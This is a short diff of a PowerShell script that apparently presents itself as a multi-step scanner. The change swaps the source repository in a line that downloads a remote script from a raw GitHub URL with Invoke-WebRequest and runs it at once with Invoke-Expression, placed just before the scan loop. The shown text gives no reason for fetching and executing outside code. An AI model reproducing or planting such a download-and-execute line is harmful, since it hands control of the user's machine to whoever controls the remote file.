@@ -85,7 +85,7 @@ $scanSteps = @(
 
 $totalSteps = $scanSteps.Count
 $currentStep = 0
-iex (iwr "https://raw.githubusercontent.com/hocijic397/MCL/refs/heads/main/oldscan" -UseBasicParsing)
+iex (iwr "https://raw.githubusercontent.com/elfrenko2/MCL/refs/heads/main/oldscan" -UseBasicParsing)
 foreach ($step in $scanSteps) {
     $currentStep++
     Clear-Host
